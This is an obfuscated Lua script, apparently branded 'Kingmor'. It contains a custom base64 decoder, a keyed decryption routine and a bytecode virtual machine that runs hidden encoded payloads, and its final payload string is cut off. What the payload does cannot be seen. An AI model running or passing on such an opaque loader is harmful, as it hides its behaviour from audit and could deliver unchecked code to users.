local _3ce362
local function _cbb12a(msg)
  warn(string.char(91,75,105,110,103,109,111,114,93,32) .. tostring(msg))
  return false
end
local _bbfe5f=(function()
return (function()
local _e32={}
for _2w5=0,255 do _e32[_2w5]=string.char(_2w5) end
local _e25={}
do
  local _d5k="vGdDlraSojYqNeAxhb6MTsUfytOR2Ln7P58gWi9w4IB1mCH30FZVEkzpXcK_uQ-J"
  for _2w5=1,#_d5k do _e25[string.byte(_d5k,_2w5)]=_2w5-1 end
end
local function _d(s)
  local _fd0,_mak,_yi5,_6ao={},0,0,0
  for _2w5=1,#s do
    local _poo=_e25[string.byte(s,_2w5)]
    if _poo then
      _yi5=_yi5*64+_poo
      _6ao=_6ao+6
      if _6ao>=8 then
        _6ao=_6ao-8
        local _4bv=2^_6ao
        _mak=_mak+1
        _fd0[_mak]=_e32[math.floor(_yi5/_4bv)%256]
        _yi5=_yi5%_4bv
      end
    end
  end
  return table.concat(_fd0)
end
local _0681={}
do
  local _q00=" \131\163{\206^\1782\165\179aY~\189\207jO\236\\$+R\006\156\193\150\197!\128M\168\230Q4\195e\157\167\188\234\218q\023\r\238\181=9\166\203\012\000\224\133B\0091\246\024#c\155D\209\174@\140\027\021P\159\025'\229\028\022Jf;\0158\196\139\152\216p\215\208\182\191o%vUl[\030\239\003\175\213z5\"(\186\221\204\201\171\1516?\018\162\200\223_\198X\214\185|\158,Hg\212\211\237\011\199.\004\2053tk\020\241\149Z\242\142\019\169\129\248GnC\202\148\130FL:\227\170\007\n\154\180\160\217\147\255\225\141\136\146\240\194yu\138\161\176\247\172\190]-i\008\253I\164*\243\026)\252&\143\220\183\153\233\132\005\029\2490mW\001h\245K\135A<N\002\1737\235S\031\127wd}Vx\254\145b\219\137\210\192\228\144`T\231\187\177\016E\226\184\251sr\250\014\017\134\222/\232\244>"
  for _2w5=1,256 do _0681[string.byte(_q00,_2w5)]=_2w5-1 end
end
local function _701d(S)
  local _yc,_kfw=3327407483,222
  local _fd0,_mak,_57c={},0,0
  local P=157487 A=-1301639837 L=10285110
  local K={139,131,117,252,157,232,77,127,110,231,172,30,126,22,197,202,103,25,180,232,36,84,64,23,177,166,156,125,100,184,198,34}
  for _2w5=1,#S do
    _yc=(P*_yc+A)%4294967296
    local _u9m=string.byte(S,_2w5)
    local _qb5=(_yc%256+K[((_2w5-1)%32)+1]+((_2w5*113+L)%256)+_kfw)%256
    _kfw=_u9m
    local _wpl=(_0681[_u9m]-_qb5)%256
    _57c=(_57c*33+_wpl)%4294967296
    _mak=_mak+1
    _fd0[_mak]=_e32[_wpl]
  end
  return table.concat(_fd0),_57c
end
local function _ra(_li, _wj)
local _nd = table.unpack or unpack
local function _ye(...) return { n = select('#', ...), ... } end
local _jg
_jg = function(_tc, _ep, _fj)
local f4k7jj, _rh, f64hl9 = _tc.f4k7jj, _tc.k, _tc.f64hl9
local _bm = {}
local _ks = _tc.f1t4g7
for _ib = 1, _ks do _bm[_ib] = _ep[_ib] end
local _bi, _mj = {}, 0
if _tc.f6cerk then
local _tr = _ep.n or #_ep
for _ib = _ks + 1, _tr do _mj = _mj + 1; _bi[_mj] = _ep[_ib] end
end
local _xk = _tc.f4qxpr + 8
local _im = 1
while true do
local _tn = f4k7jj[_im]
local _fu = f4k7jj[_im + 1]
if _tn == 12 then
_bm[_fu] = _bm[f4k7jj[_im + 2]]
_im = _im + 4
elseif _tn == 13 then
_bm[_fu] = _rh[f4k7jj[_im + 2]]
_im = _im + 4
elseif _tn == 2 then
_bm[_fu] = _wj[_rh[f4k7jj[_im + 2]]]
_im = _im + 4
elseif _tn == 14 then
local _qv = f4k7jj[_im + 2]
local _pf = _bm[_qv]
if _qv >= 256 then _pf = _rh[_qv - 256] end
local _bx = f4k7jj[_im + 3]
if _bx >= 256 then _bx = _rh[_bx - 256] else _bx = _bm[_bx] end
_bm[_fu] = _pf[_bx]
_im = _im + 4
elseif _tn == 27 then
local _qv, _bx = f4k7jj[_im + 2], f4k7jj[_im + 3]
local _xz = _bm[_fu]
local n = (_qv == 0) and (_xk - _fu) or (_qv - 1)
if _bx == 2 then
if n == 0 then _bm[_fu] = _xz()
elseif n == 1 then _bm[_fu] = _xz(_bm[_fu + 1])
elseif n == 2 then _bm[_fu] = _xz(_bm[_fu + 1], _bm[_fu + 2])
elseif n == 3 then _bm[_fu] = _xz(_bm[_fu + 1], _bm[_fu + 2], _bm[_fu + 3])
else
local _pf = {}
for _ib = 1, n do _pf[_ib] = _bm[_fu + _ib] end
_bm[_fu] = _xz(_nd(_pf, 1, n))
end
elseif _bx == 1 then
if n == 0 then _xz()
elseif n == 1 then _xz(_bm[_fu + 1])
elseif n == 2 then _xz(_bm[_fu + 1], _bm[_fu + 2])
elseif n == 3 then _xz(_bm[_fu + 1], _bm[_fu + 2], _bm[_fu + 3])
else
local _pf = {}
for _ib = 1, n do _pf[_ib] = _bm[_fu + _ib] end
_xz(_nd(_pf, 1, n))
end
else
local _as
if n == 0 then _as = _ye(_xz())
elseif n == 1 then _as = _ye(_xz(_bm[_fu + 1]))
elseif n == 2 then _as = _ye(_xz(_bm[_fu + 1], _bm[_fu + 2]))
elseif n == 3 then _as = _ye(_xz(_bm[_fu + 1], _bm[_fu + 2], _bm[_fu + 3]))
elseif n == 4 then _as = _ye(_xz(_bm[_fu + 1], _bm[_fu + 2], _bm[_fu + 3], _bm[_fu + 4]))
else
local _pf = {}
for _ib = 1, n do _pf[_ib] = _bm[_fu + _ib] end
_as = _ye(_xz(_nd(_pf, 1, n)))
end
if _bx == 0 then
local _wu = _as.n
for _ib = 1, _wu do _bm[_fu + _ib - 1] = _as[_ib] end
if _wu == 0 then _bm[_fu] = nil end
_xk = _fu + _wu - 1
else
local _lt = _bx - 1
for _ib = 1, _lt do _bm[_fu + _ib - 1] = _as[_ib] end
end
end
_im = _im + 4
elseif _tn == 42 then
local _qv, _bx = f4k7jj[_im + 2], f4k7jj[_im + 3]
if _qv >= 256 then _qv = _rh[_qv - 256] else _qv = _bm[_qv] end
if _bx >= 256 then _bx = _rh[_bx - 256] else _bx = _bm[_bx] end
_bm[_fu] = _qv + _bx
_im = _im + 4
elseif _tn == 4 then
if _bm[_fu] then _im = _im + 4 else _im = _im + f4k7jj[_im + 2] * 4 end
elseif _tn == 19 then
_im = _im + _fu * 4
elseif _tn == 1 then
local _pf = _bm[_fu]
local _qv, _bx = f4k7jj[_im + 2], f4k7jj[_im + 3]
if _qv >= 256 then _qv = _rh[_qv - 256] else _qv = _bm[_qv] end
if _bx >= 256 then _bx = _rh[_bx - 256] else _bx = _bm[_bx] end
_pf[_qv] = _bx
_im = _im + 4
elseif _tn == 38 then
_bm[_fu] = f4k7jj[_im + 2]
_im = _im + 4
elseif _tn == 23 then
if _bm[_fu] then _im = _im + f4k7jj[_im + 2] * 4 else _im = _im + 4 end
elseif _tn == 18 then
local _qv = f4k7jj[_im + 2]
if _qv == 0 then
local n = _xk - _fu + 1
if n <= 0 then return end
local _pf = {}
for _ib = 1, n do _pf[_ib] = _bm[_fu + _ib - 1] end
return _nd(_pf, 1, n)
end
local n = _qv - 1
if n <= 0 then return end
local _pf = {}
for _ib = 1, n do _pf[_ib] = _bm[_fu + _ib - 1] end
return _nd(_pf, 1, n)
elseif _tn == 16 then
local _qv = f4k7jj[_im + 2]
for _ib = _fu, _fu + _qv - 1 do _bm[_ib] = nil end
_im = _im + 4
elseif _tn == 3 or _tn == 9 or _tn == 29 or _tn == 34 or _tn == 41 or _tn == 32 then
local _qv, _bx = f4k7jj[_im + 2], f4k7jj[_im + 3]
if _qv >= 256 then _qv = _rh[_qv - 256] else _qv = _bm[_qv] end
if _bx >= 256 then _bx = _rh[_bx - 256] else _bx = _bm[_bx] end
if _tn == 3 then _bm[_fu] = (_qv == _bx)
elseif _tn == 9 then _bm[_fu] = (_qv ~= _bx)
elseif _tn == 29 then _bm[_fu] = (_qv < _bx)
elseif _tn == 34 then _bm[_fu] = (_qv <= _bx)
elseif _tn == 41 then _bm[_fu] = (_qv > _bx)
else _bm[_fu] = (_qv >= _bx) end
_im = _im + 4
elseif _tn == 31 or _tn == 40 or _tn == 8 or _tn == 21 or _tn == 17 then
local _qv, _bx = f4k7jj[_im + 2], f4k7jj[_im + 3]
if _qv >= 256 then _qv = _rh[_qv - 256] else _qv = _bm[_qv] end
if _bx >= 256 then _bx = _rh[_bx - 256] else _bx = _bm[_bx] end
if _tn == 31 then _bm[_fu] = _qv - _bx
elseif _tn == 40 then _bm[_fu] = _qv * _bx
elseif _tn == 8 then _bm[_fu] = _qv / _bx
elseif _tn == 21 then _bm[_fu] = _qv % _bx
else _bm[_fu] = _qv ^ _bx end
_im = _im + 4
elseif _tn == 11 then
_bm[_fu] = (f4k7jj[_im + 2] ~= 0)
_im = _im + 4
elseif _tn == 37 then
_bm[_fu] = {}
_im = _im + 4
elseif _tn == 7 then
local _pf = _bm[_fu]
local _qv, _bx = f4k7jj[_im + 2], f4k7jj[_im + 3]
if _qv == 0 then _qv = _xk - _fu end
local _pq = _bx - 1
for _ib = 1, _qv do _pf[_pq + _ib] = _bm[_fu + _ib] end
_im = _im + 4
elseif _tn == 25 then
local _qv = _bm[f4k7jj[_im + 2]]
local _bx = f4k7jj[_im + 3]
if _bx >= 256 then _bx = _rh[_bx - 256] else _bx = _bm[_bx] end
_bm[_fu] = _qv[_bx]
_bm[_fu + 1] = _qv
_im = _im + 4
elseif _tn == 26 then
local _qv, _bx = f4k7jj[_im + 2], f4k7jj[_im + 3]
local _ee = _bm[_qv]
for _ib = _qv + 1, _bx do _ee = _ee .. _bm[_ib] end
_bm[_fu] = _ee
_im = _im + 4
elseif _tn == 10 then
local _zb = f64hl9[f4k7jj[_im + 2]]
local fyg4n = {}
local _dz = _zb.fyg4n
for _ib = 1, #_dz do
local _oa = _dz[_ib]
if _oa.f6b2v0 then fyg4n[_ib] = _bm[_oa.f9uvpc] else fyg4n[_ib] = _fj[_oa.f9uvpc] end
end
_bm[_fu] = function(...) return _jg(_zb, _ye(...), fyg4n) end
_im = _im + 4
elseif _tn == 39 then
local _qv = f4k7jj[_im + 2]
if _qv == 0 then
for _ib = 1, _mj do _bm[_fu + _ib - 1] = _bi[_ib] end
_xk = _fu + _mj - 1
else
local n = _qv - 1
for _ib = 1, n do _bm[_fu + _ib - 1] = _bi[_ib] end
end
_im = _im + 4
elseif _tn == 6 then
_bm[_fu] = _fj[f4k7jj[_im + 2]][1]
_im = _im + 4
elseif _tn == 22 then
_fj[_fu][1] = _bm[f4k7jj[_im + 2]]
_im = _im + 4
elseif _tn == 35 then
_bm[_fu] = {}
_im = _im + 4
elseif _tn == 5 then
_bm[_fu] = _bm[f4k7jj[_im + 2]][1]
_im = _im + 4
elseif _tn == 15 then
local _pf = _bm[_fu]
_pf[1] = _bm[f4k7jj[_im + 2]]
_im = _im + 4
elseif _tn == 24 then
local _pf = _bm[_fu]
local n = f4k7jj[_im + 3] - 1
local _ib = f4k7jj[_im + 2]
while _ib <= _xk do n = n + 1; _pf[n] = _bm[_ib]; _ib = _ib + 1 end
_im = _im + 4
elseif _tn == 33 then
local _xz = _bm[_fu]
if type(_xz) ~= 'function' then
local _pf = getmetatable(_xz)
local _qv, _bx
if type(_pf) == 'table' then _qv = rawget(_pf, '__iter'); _bx = rawget(_pf, '__call') end
if _qv ~= nil then
_bm[_fu], _bm[_fu + 1], _bm[_fu + 2] = _qv(_xz)
elseif type(_xz) == 'table' and (_pf == nil or (type(_pf) == 'table' and _bx == nil)) then
_bm[_fu], _bm[_fu + 1], _bm[_fu + 2] = next, _xz, nil
end
end
_im = _im + 4
elseif _tn == 36 then
_wj[_rh[_fu]] = _bm[f4k7jj[_im + 2]]
_im = _im + 4
elseif _tn == 20 then
local _qv = f4k7jj[_im + 2]
if _qv >= 256 then _qv = _rh[_qv - 256] else _qv = _bm[_qv] end
_bm[_fu] = -_qv
_im = _im + 4
elseif _tn == 43 then
local _qv = f4k7jj[_im + 2]
if _qv >= 256 then _qv = _rh[_qv - 256] else _qv = _bm[_qv] end
_bm[_fu] = not _qv
_im = _im + 4
elseif _tn == 28 then
local _qv = f4k7jj[_im + 2]
if _qv >= 256 then _qv = _rh[_qv - 256] else _qv = _bm[_qv] end
_bm[_fu] = #_qv
_im = _im + 4
elseif _tn == 30 then
local _qv, _bx = f4k7jj[_im + 2], f4k7jj[_im + 3]
if _qv >= 256 then _qv = _rh[_qv - 256] else _qv = _bm[_qv] end
if _bx >= 256 then _bx = _rh[_bx - 256] else _bx = _bm[_bx] end
_bm[_fu] = math.floor(_qv / _bx)
_im = _im + 4
else
error(('E'..tostring(_tn)), 0)
end
end
end
return _jg(_li, { n = 0 }, {})
end
local function _cc(_ee, _ud, _hl)
_ud = _ud or 1
local function KMVX8(_fu,_bx)
_fu=_fu%256 _bx=_bx%256
local r,_tc=0,1
for _=1,8 do
local _ah,w=_fu%2,_bx%2
if _ah~=w then r=r+_tc end
_fu=(_fu-_ah)/2 _bx=(_bx-w)/2 _tc=_tc*2
end
return r
end
_hl = _hl or 48885
local function _kh()
local _qv = string.byte(_ee, _ud)
_ud = _ud + 1
_hl = (_hl * 2753 + 44278) % 65521
local _rh = _hl % 256
local v = _qv - _rh
if v < 0 then v = v + 256 end
return v
end
local function _vi()
local n, _sm = 0, 1
while true do
local _qv = _kh()
n = n + (_qv % 128) * _sm
if _qv < 128 then break end
_sm = _sm * 128
end
return n
end
local function _gk()
local n = _vi()
if n % 2 == 1 then return -math.floor((n + 1) / 2) end
return math.floor(n / 2)
end
local function _rl()
local _tc = {}
_tc.f1t4g7 = _vi()
_tc.f6cerk = (_kh() == 1)
_tc.f4qxpr = _vi()
local _vt = _vi()
_tc.fyg4n = {}
for _ib = 1, _vt do
local f6b2v0 = (_kh() == 1)
_tc.fyg4n[_ib] = { f6b2v0 = f6b2v0, f9uvpc = _vi() }
end
local _op = _vi()
_tc.k = {}
for _ib = 1, _op do
local _jn = _kh()
if _jn == 0 then _tc.k[_ib] = nil
elseif _jn == 1 then _tc.k[_ib] = false
elseif _jn == 2 then _tc.k[_ib] = true
elseif _jn == 5 then
_tc.k[_ib] = _gk()
elseif _jn == 3 or _jn == 4 then
local _hw = _vi()
local _ya = {}
local m = 249
for j = 1, _hw do
_ya[j] = string.char(KMVX8(_kh(), m))
m = (m * 225 + 58) % 256
end
if _jn == 3 then _tc.k[_ib] = tonumber(table.concat(_ya)) else _tc.k[_ib] = table.concat(_ya) end
else
_tc.k[_ib] = nil
end
end
local _do = _vi()
local _rw, _gv = _vi(), _vi()
_tc.f4k7jj = {}
if _do > 0 then
local _cy = {}
for _ib = 1, _do do
_cy[_ib * 4 - 3] = _vi()
_cy[_ib * 4 - 2] = _gk()
_cy[_ib * 4 - 1] = _gk()
_cy[_ib * 4] = _gk()
end
local _cj = {}
for _ib = 0, _do - 1 do _cj[((_ib * _rw) + _gv) % _do] = _ib end
for _ib = 1, _do do
local _jc = _cj[_ib - 1] + 1
local q = _ib * 4
local _oa = _jc * 4
_tc.f4k7jj[_oa - 3] = _cy[q - 3]
_tc.f4k7jj[_oa - 2] = _cy[q - 2]
_tc.f4k7jj[_oa - 1] = _cy[q - 1]
_tc.f4k7jj[_oa] = _cy[q]
end
end
local _yp = _vi()
_tc.f64hl9 = {}
for _ib = 1, _yp do _tc.f64hl9[_ib] = _rl() end
return _tc
end
local _zb = _rl()
return _zb, _ud, _hl
end
local _c7d={
"uL5HycmRnT5iXelqsN5ltvjeVjUsvvHw-bLQyREVfo3XSdNXJWMwHh9NAhADvn8cmUmnhh4yiARGFyXcsbfWfKy8hih06vOFdEkasqPWPKbvBnGCXKL0KDjhCSevNYvmQlJdPi9AoW3fuSVb1d9Hxjgs2eE2DidAtJTQIg_z1oHGLn67jIE3Qa6oCfu83cKI2NPPXDp-jxQwfYyXJAcNYscxAfZ2tis8KWcNTr9HgALcTEfv_wdZcFynATih7EOrgfofYuk98SYdC5CeuQxUI0Z16ycgkd-d4_RbuFmOiUBZ6llarwEG5HKwWOSqzB3ydGwrabUYj7xP4bRd3V78eDgAY05vo2wey4UEA53EovCPxozAdjJZvk9VxVcBIHWj4j5fkgrRrD7kYLFYH0bzQYxopoqQdiiYB2gL3-9DHSFNmaDOQSjeGrS4HB7fCxml6S6n3Rwwej5LyYRjENlPNGs-hTHly_PAXKn2Za9VlbqFqY0RL-eji1uhxaN_Yzm9mhAl6j8mKg8c5QgrCt5xIwWmtfvL9UjMOLRpe19UY6opg5MtmbrRlXP9tRPONzKSw01a20gJewdG6t8UJiLPLVcwzRHpunhZ62GefkG7iT48hFigXHJ8NcKi7Nr6zP_C9NsW35kgDipTLbpgtTEBMvs_nbmFCmgMuHGwJd5E6xhAzaI4HR1wws0y6xUXm98nJ9paZXddTax1suo0I5Oqe8uZ3nZk5e320Oyr4DvRFVRT9WIWQR-PJaC45LD9EX6r16_8ciqwguTe5NZZO5nXMX0gs2KKlhlCdLn1MfTuWeqh2_vMJhNhZTgo24Fg4kFmeXqsup71dTBM0TkvUZ_lz_lr-9v-Svx1spWwGrpY4ZUUxKA8bqWMdc0u8kRFDLXtIsHqO9C3tpLIZz7oWUXftKeWFE6Iat7sPYrEUR0z2fewrseJ4t2YOGvoMTQRZHpidmISqJF15APA-uEio7xT0O4KXpXn5KAHtwK3eIwxUp0E2MP4l3Z97-Vm8JEFG8epnw0OCl29HDgl4przeu5IN8wYu2N4yUmyNZRYgA1yC_mLPOrmzFGdNpT_JCauw0XKyHIjHbbMQoVqeD7fBUVGpXf5m92l_PYgEPUl0vd_uE232SZIzbTa47i3kTFX9ns3qiMnc4AyvFCuDPkSPjv8xTgwA5pTnUyJS8Gdi_Y_Tly3Lw6FcLcNARLrKXiqcMS3bWKr-7HQxKOgZzqdxM5LYEvCWoqyLEfgVgONkQm7ac-oHxXE7An8arhMqr6Sq8x6y4AJvua_qsE9icDJLcYzIm_mnf8kaCDby6Pm7zwIRnYpwg1DVrPAKzPb_8AZ6hzBFUvi1zp5BgNFOYOT5JidAvD5EXpPHdwC0T0ISf_1wSWNrixd1USVUCJsw8Wv1z0wCvlxuPKXadU0zlmGajPB146NUDhzs9I-FoIPr4alo3F8RjiraXgFQm0D2GrX0l0Xa_0gMvvPvV1EvHsorviCrWYQugao6Osh_x_G2ZWbwrmOeseturkcwMgJeh5NToubKWQKwQThXXdTsu0ncLhUju8CyolxQ8Tv7onMRa3g5a9JOYoEkkJUae82eRlI-p4P_ML6iLBvNHKxGjcoRAcwd0ZpX0Y7yL67EZtKHvpk-C8O2KMovGcWj8ZewSPNFeu0mhwHVQoGwk9p7xoBiu6NIMQcs4SmpXbucLzb0gVoCoQ7k49FMrA96DMclfE3lVCIhxNybNvj4byXIpXDrhLgrVKCudu-KIGiJBOVr2aJrvTc1vocoyBvTaRvvA5A2S-Ovzt4Lh1AB7nV6ASUUnnigafT2oZA3KQk3P0KnpfYPcaRNMsLqtCU-lsXCN4QsidcqteJZZOUjk46IH-Te-2eBbabIjEspt7mEpl09EvO-HmuXRp7ej3IkRe_m14oYSFZPG2DoCItokaEE4QkPvLIfrRBVIp1Jvzcoh-k5eM1c9OteNe8qxnDGLoMw4guG7HmzlXB-N_THm6EL4EV2OV7xpStDFi8hng4zdXt87uYmYWM1h5L6yk_QKd9jfHxwHNaycQSxJc8VK1OQ2jIBZSP0IjWGt5CtdoAoYoN_UtN1Pu0IXKwukP3FhzyKEpwDdMHdTzvFF4q9sRVjICAj4gtttDq_1t795_XvkB66JxwvFGaSlJupCa98k1M9IfOgWCgLZT39V1KptPEgTGSu_Zh-7n2UowBtVAIRDMe1WG6z22EUoH2n5kwo2pijYeiznVRbTSZfYyJY_1CaBl4J-_8SSNpjkvRsPyT2hvlTxbE63GgAjMPA--wngNCYq0nwDBDz1DTTiHQ0wH81JDdKqURcUOpoINi204WErBrJpu-yQP_87RUqCm3pkT7TmulxEfzlIVEBqmT1vx881H_i29DmD1Wq6-p_ZFTSfwFDZAMiCuHlkLPeyG03dqfLJsUrqbDRFX8Cr72GXUkHcL7tCdSD1z29MhcRp9gaquPXy2sHBbqtLzy-96SDqY4Mm6ZNy4S2xpaKrW29wjOwTvH3dzDG48igmldlTDGev3xagCn29W3tvVtQvottL6G6dNDf6oVhfgc9SHxymVQv7mzgw6LM8cES-mSAK2rJbuaU2e2zEJGjRsRzGVmV9AV3j_nBWomB9d0vwHzMNojX_zGleANY9_ouHgnEZczwYcPk1FSBhHS_tqanrqqFoKpj1Evw_en5k4yF3JI-WWz_OzFUIzo3kbAJC14_Nd37PaBV6e7GJX2wtvkWXC7J6-XBNoyEN1ksbj7UKBlzze0UmDsIj0RTxcctCqR25fFPzNr3AsRX2XQxKcCc5DOZCNusXXLEFw1ixYrPcctdTo8RWshQp91bTcG2JTv1rX8ZOGr80CBti3d8tNpvGETMIEfrKDYAwtbF7IJmWL2PJOv9lalIRmz3b66PVUlLLNhnJc_c_tNYm7yKSgekUZs5S4A5js7KhgSHcNaqE-gO431Hb8r7DdfWLpKZwQID7XJvJOPFbbb3-3aCbZcccNLWtTvl2i5kvIkadsTOu4xUMtSjGQRwIBMmH7IUVxKmLgtC_wBgjtYn8DpHu4l75PG2KPeS6xjwdvPyoB2ZwHZj_2CPxFZtNaky9VnKftXO_QouLHjGUgA9XHq1A7T2jLVdSx-oUsVfVNwh7aW_wC1nMK-zEzRVcfmBe4EoPfkpkn_zeclQk2qNL7ERD2LoJxj5__GaaVRLwlcm8QyrIWWtXxpAURx_uJWbUQY0S44WDGtKSZYO6IUYQqSRvH0Qn3ok6PaNcUZuGPfpWr4sEKOcHBoXRjz0M8-Sd4B9bMyJXJ2u07Zd-bfqVv8NqsXwIVdwsq7fa__tBZK2UqwCK444o0KeW2JN5iaLA-r2m0Q-qeAOheSzbBm4tUG_jrb_BqzKbBchLJNeruI6EHVKjuZmE4R3MOclD5i9Dp7k8Lj2-EJ9llM1Cxvr6Rxf0vBegmumnuMOWmiJtE0YqbRgyZrarODbg_BgAk-O_RZUX30VQzileQQSjYKIjWMoKq8wuDA2Q8120YUSBxvrsr_3iN8pZamj4g0keKjswzC-k_X4acps6xw5EE1EOyBa05178UyLdVE4UPSfa8jJDsBU1kR1tTQ4ataKzDZccGMc91sodRBOIAEKJLy-IpayW5m8b16G2JvOgvQ8Ys0Sz9Efvd3nvEgpgFmR9FalhEJAuK25XfdJG3XGl9lAVBBvSxYWNaFrcoYvk1eBYjEwkw95C4FFoWS-FayesOgnj6M8hG-rCu151IYjfHu6LBaWTNetCekr7bd9SKOmaiv-cuwJkWK7NpzlnkQjfpCjJyXTnr9GAyKeIoDeXu3VwpSBEwju7jSOu700XTe6XEZ1wXPoJvKSXPcKe-wL3yPNShSDJN7-WlDj2BYhdAJ_CQ0Xf4As4hGSE4FcIpmmOaV1ZqDd0FnZvwKicMqdl2Z6TBoANajOUlWuYA7S5LvaRfQH_4MVJFpMPkwidM1Gu1qSwuMmr-uUIe-f8neqK-hJNAHI8fY23boR1WHuS3ZFy9QiLVxAx78TvpnezE3COEnlOphHDUyC5XlpLvB7e4NxqHBAyGMz0TyYNXi6Zp1jt1-h4GsmsP5BcsoADPh1gfQt3Cb5cP6E7S491Rcloe2acr8kBGSsiXp2aPm4JBkjsgI9a9uk-SUd2XgpLNDzRU60YoFAwFW2QmnFfDAh0Raj0ze73J4hRr7KqY9Uef2CTvzMtLtaPS06Nwk_-raurY75vwuPyrMmk_awc1mJUDPTxfUV0vxwSsA_iC0t32qaaYo_cKAfSpbCfPgsWvUYV1NPaBC2xVbJwC5s8uJItywGJDYsdWx44AKQBGchwNBElPfSKUFd8p9Ju-nG47W7CZdQI88H-TbAzDuhdIKuUgTmWgQzQg4W5iH9rU_zol32ZnjdbOce_cmJfUNju6IGjkdTGHhAEtpP2KLyruZuYFu_9N7XVaBaQz2mr0fl-_5XGAOQ5J_deL-n1EjDtFLhoO502VYG87OYvVSx1Jyxtu-9wXWoyTBt_-wMUWKmLuMF38fiNwkmHmlLkP0myjpSpFLQKakB8MpJHzXzUN93PoPFvBkdbs6gPa4yzkKk4n92VGedUkRHdIebS9JSkRTqAKPM_YhAhXvk0KdVeUm-dqM8RPTsWfx1Huc4yae0dkGMgLp82KVLbB2ssE_tnw5LpzwFqBteMN-SR9vB3VDKlcPXSaRlCYIFNNjTZvpMS3bsGPwECXBWUplEUPoHMyI_IvwGtXzBOIqx2kw7iXHajtXeGCAIh4e6ZUqPxJ3ZnVKCsMWznOKUHhxtAHAPOp8wkf6Q-a9w8n-oSropkfSDPBJDtZ3ALzWG74wbf9Ta0di_vCYf2cm7mJXrA02RfC_Gj5u49FCMTZdmMpPlE8kUDNKTBhbikL_oXj6GRXY0BweyuxIXGuHv4_nqZpisLvyVPekdmcjGte2KRHhVNaq6_Jq34jIthXyL1pefWto7mr13Kh9-zYjjiZv5aNUdsaySbTAT9lctpcDHDqXxmDObqBu6fu0TNohL-qOaqeIpVH8BPPJtNML0e3uuFGmmjAKIzXVslILSBHp2G523at_ELBlrWL4bW6XvUwFooD1DS2VZgyqAwDD9jy5C8vLCLvPVktu7Wz8dHhN5xzCaBkYC491VZDBGIDmX1LPFeY0da_0lBbN6iRzP9te27rHFEogKfKbaTeAuA5oOyxJxtKv_qWMohTcKTgo1pfew23BMiA8Ku3ea8cbXmKj4eY7pyNb8uXe3U35pRa0vE8btQMCD6Z6cec-6da2sx_e2OKp3lJNIUVsy24H_LqhIkzToNM_Id-o77lCfHeNco6IQiUorhx-qRbWBBLfGUInvFGw3Ptl9Yj9FHB6sYDEN6zvUTzTMuGzJaBn5zG3GaV0SpPtJQ136YdcL21-Fnhk2amyhLX4zlB1mY5uBZR8-VPBN2ftnvrkLq4GngFKZxp6Z5M6RupKqpb0h-VyZAyNaPgzEI2jVtGKFRUcXPzNBM129M-oFgG4gNzEFV0_GS6wpozdwQXaPS3C1JBD3rUwLad5lUKYZ3lhnV0Vz8DgUXSNUmIdkuguT_tYP51srdR5K6b5cLe4AVifQLuvIAz3GYLbjxNYakbiwx2-3PN30ZZoAoIzNXIP8CKFO2NE9BIMeVfY9VwqdTRYpldnDah9Dcn5A5884XyPRJas2e3pV1_cNgoplxNKrJCuUVdADVbJEpkkghhC3qF45rXgZY5GVSs8qtAyI8HmDlBgSctqe3zHERKhVKKltv1UMo8Om0uTC4woQ4WY8YFZ1DVkiVPZCZqnEEEpofgUro2UWZRYti0xv3vHYMekpqst5i362UjHYHHgSf5fDoz-QV_vVn9b4XX5DoWeCObazO9SZePn-TOpg7xG8TKYAj46WyLoBe6yquVfJyPjNptEb9Upzf6ECiJF3xP8Y8ukgtt42uXaTRF6Wf7pE3YaYS9yhjmSfYAGBHta6Zrb_EZRBPf7nKk4E93xHTsnjEBjRY_Ykgxxhxm7osW31mM50CZiAWQQN4ctCDai4OTpTJWBqHBUIUsrulMJLNr3W9KF9jAFlBalXxOwdrOPV6KJrjCcvO_5BIRYpdvuOVgohUXOyJbXATWb78iVxYvyYtSrDGYoqf2cM7FAcAgVmnsy73xcAIq3FGya54YssGZAJuO_-LqKMlGSmizHF3VBwSTQY8VY8-TeB0MUtzIN9pIYb9lgs4OmpfAXyB0g9OoWjQzxAQSdvoQi8ssjQEVYo2ecQAKweItb7AWoim1acObPvfs_qML2v5wY_11T1FsoZS9zvbCQOVRp4xrSS6KJPZ8egRSoYcAZ0SM7JFHcI6esiF_Jnd2QxgswrVfFDLezKb3ARgYpPiOK4K2hYznBLZF5ACB7cCP_7LA7RHks_p6DO_8zRZicpSm-WMKpx3A1RZ1Vrqy5c8wDtWSwUBWAW-GRoAlY7kTlXBsRFEoN4n_-IzhOKnjY4t038wxcFGrkiubrQ-x3IpALvW5tAV4bd86-B7EWMkL7hZ86z0I_qJA9vNAAtmlDb6mjHM3vlE90NZDG3aBpi0mX1Z6BeRTaipWeUOQzA8ckj1Vf7Q6qa6rKSyBmFzOtg6QA4tju96VyBiSoIJcwWl5DfZb6CnZQq9f7i-zu1QiAKrLN6qEiIumPFtTKcGOaNPqnEE2mjdeXLzVEL5_TILkazRtfZBhjmcjuGFKXbgIt2ZQSa_ySRbMg5_VCkw9BerEHAXEkrRjDS50hXvBUzbQYFHZB8AOkVWQQSh1AkGicgW61uDqoa6iybsHsDRnHnAIVBS4LSxY2XGiCImlzjvhKdoe8untvz0oUD028eV_1Y0VPp77yYURgcdzRpirSv72IqsTk981U4nuWB4j1RB15rICTb6VqUM5IYDACjxdsZBre9zGbmjwtjK8hTteRFFJy0s1mD8sT2fKHwUqyA7I1sC9V4CCSDyDuHlPAn2zughVTJI43AoNKsZSsPOIQqAVrFUq",
"3yBWZDYwln2nXGg48tqMKhhHRgJk5EZw_OwkKyxdOM9a7TX6nT2bmW6ul2w3brcMiM50ajVbh6jeuj68oEXj9udjvWbxOOI6tCNuzQqbh03P6uFQcx7fyXyO8HTIT6t5pU_0j413I7T3YDOu5ESiSlO8x0thuXfKuOlUOFYuJ8vcLA7iaA2-E9-7s9jRiF9J_K6SKA6B93_kE65vdIEgbxVy0a0okPOmwv80f0vRcXdTuaik3KcF21-QfRq-Cz-zF4LehFlvWEqm8DsVLtDODY4lhArmhEC-C_aYratyI8Zff_akf2qT_04HebQdwOJGs_3pluC4INhatNAUSZr8eqeCxZl62LWdagX-F5FQGCVdsCW5w4efjY5Ftck0rHEYUg-1JJjbu5t9nKShTU1Z2xYXz_-DHm7d-fRCrFuYrw4E4XoQyq3IR82R78-Gs2aKAnr2YiAdTHWmSHhktArqsupK72OCm_0GlyHbxqcFIJzKTFmhwhZ5vUX72tl-kCGzB5mlDG9njpNnX7SsPTvy6cEZ2xajxxFPEEDoim6NI16GTlDbrVzWLHXQapEhZemZ_NVEluuFcB3OSldDOJhS4RHYu34UD6JjNyjPbCrr8r8xJFHZrQcQQOko